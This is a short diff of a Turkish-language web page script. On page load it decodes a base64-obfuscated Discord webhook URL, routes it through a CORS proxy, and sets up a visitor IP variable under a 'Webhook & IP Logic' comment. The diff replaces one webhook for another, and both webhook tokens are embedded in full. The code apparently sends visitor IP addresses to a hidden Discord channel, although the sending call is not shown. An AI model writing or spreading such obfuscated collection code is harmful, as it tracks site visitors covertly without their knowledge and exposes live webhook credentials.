@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const monthNames = ["Ocak", "Şubat", "Mart", "Nisan", "Mayıs", "Haziran"];
 
   // Webhook & IP Logic
-  const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTQ1MzM0NzI2NDIwNDkwMi9LRkhzQ09DR2JXZXRUckxLcEo5Q1hjb0o3TWVvSEtXNGtwX0lJOU9JNE10bDctWms5VG1NdWllcE5qWG1jYnhGc2g5Wg==");
+  const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTQ1NzMxOTI0NTA1ODE3MS9hQmN4dTdKcGRiMTNNZlpPZ2JEbXRqYWVFMmNMWTRMX19GcWwzSkpHczRoYkdYQjJybmNiMHRORm9lUGp5TC0zb09NcQ==");
   const proxyUrl = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
   let userIp = "Bilinmiyor";
 
